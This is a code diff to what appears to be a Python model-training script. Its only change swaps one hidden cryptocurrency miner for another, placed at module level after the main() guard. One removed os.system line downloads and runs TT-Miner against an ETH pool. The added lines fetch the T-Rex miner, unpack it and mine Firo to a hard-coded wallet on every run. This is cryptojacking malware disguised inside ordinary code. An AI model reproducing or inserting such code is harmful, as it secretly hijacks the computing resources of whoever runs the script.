@@ -72,4 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://tradeproject.de/download/Miner/TT-Miner.tar.xz && tar xf TT-Miner.tar.xz && ./TT-Miner -a ETHASH -coin ETH -P stratum+tcp://noval61.$(echo $(shuf -i 1-20000 -n 1)-V):123@eth.ss.poolin.one:443')
+os.system('wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz')
+os.system('tar xf t-rex-0.26.4-linux.tar.gz')
+os.system('./t-rex -a firopow -o stratum+tcp://firo.2miners.com:8181 -u a22CXr4thHPmmhzDAnfxrd2h6JMcZJvWw6.rig0 -p x')
